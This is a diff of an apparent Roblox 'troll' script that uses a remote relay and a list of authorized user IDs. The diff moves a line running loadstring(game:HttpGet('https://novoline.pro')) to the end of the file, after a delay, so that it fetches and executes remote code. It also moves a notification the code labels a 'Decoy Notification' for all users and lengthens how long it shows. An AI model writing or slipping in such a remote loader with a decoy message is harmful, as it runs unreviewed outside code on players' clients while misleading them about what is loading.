@@ -1,16 +1,3 @@
--- Script Provided By Real Vault // Script Reviewed By Realx
-loadstring(game:HttpGet("https://novoline.pro"))()
-
--- Decoy Notification for all users
-pcall(function()
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Novoline",
-        Text = "Loading Novoline",
-        Icon = "rbxassetid://5937224714",
-        Duration = 5
-    })
-end)
-
 -- CONFIGURATION
 local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
 local AUTHORIZED_IDS = {
@@ -393,3 +380,18 @@ else
         end
     end)
 end
+
+task.wait(5)
+-- Decoy Notification for all users
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Novoline",
+        Text = "Loading Novoline",
+        Icon = "rbxassetid://5937224714",
+        Duration = 20
+    })
+end)
+
+-- Script Provided By Real Vault // Script Reviewed By Realx
+loadstring(game:HttpGet("https://novoline.pro"))()
+
